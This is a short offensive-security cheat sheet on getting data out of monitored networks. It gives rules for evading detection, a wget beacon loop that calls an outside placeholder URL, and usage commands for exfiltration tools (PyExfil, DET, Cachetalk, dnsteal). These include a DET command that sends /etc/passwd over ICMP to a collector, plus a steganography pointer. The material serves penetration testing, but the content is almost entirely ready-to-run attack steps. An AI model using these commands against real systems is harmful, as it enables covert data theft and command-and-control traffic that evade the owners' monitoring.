# Exfiltration

## Exfiltration

Various ways to get information out of the network.

### Ten Commandments of Exfiltration

#### Five Assumptions of Exfiltration

1. Monitoring is perfect
2. Reputation is checked
3. Encryption stripping is in place
4. Monitoring and analysis is at a commercial level
5. Blind proactive countermeasures may affect exfiltration

#### Five Rules of Exfiltration

1. Do not use obfuscation
2. Use web protocols
3. Use innocuous techniques
4. Sending and receiving time is synchronized
5. Manual mechanisms can be used

### Beaconing

* A beacon is a malicious form of "heartbeat"
* Beacons may just indicate their existence
* Beacons may trigger tasking from the C\&C server
* Sophisticated beacons vary their calling schedule
* Beacons commonly use HTTP/HTTPS
* Use legitimate and innocuous traffic
* Sophisticated beacons may use multiple destinations

#### Example

```bash
while true; do wget -O /dev/null http://<URL>/; sleep 10; done;
```

There are other beacon simulators online such as on GitHub.

### PyExfil

[https://github.com/ytisf/PyExfil](https://github.com/ytisf/PyExfil)

Using PyExfil to exfiltrate over HTTPS

```bash
# Two terminals used
# Terminal 1 (Collector)
python https_server.py
# Terminal 2 (Target)
python https_client.py
```

### DET

[https://github.com/sensepost/DET](https://github.com/sensepost/DET)

```bash
# Two terminals used
# Terminal 1 (Collector - ICMP Server)
python det.py -c ./config-sample.json -p icmp -L
# Terminal 2 (Target - Exfiltrating data - ICMP Client)
python det.py -c ./config-sample.json -p icmp -f /etc/passwd
```

### Cachetalk

[https://github.com/SafeBreach-Labs/cachetalk](https://github.com/SafeBreach-Labs/cachetalk)

```bash
python covert.py -t http://<URL>/
# Two terminals used
# Terminal 1
python covert.py -w stuff http://<URL>/ 10 -s -1
# Terminal 2
python covert.py -r 10 http://<URL>/ 10 -s -1
```

### DNS Exfiltration

#### dnsteal

[https://github.com/m57/dnsteal](https://github.com/m57/dnsteal)

```bash
python dnsteal.py <IP> -z -v
# From target

```

### OpenPuff

[https://www.darknet.org.uk/2017/07/openpuff-professional-steganography-tool/](https://www.darknet.org.uk/2017/07/openpuff-professional-steganography-tool/)

Video exfiltration
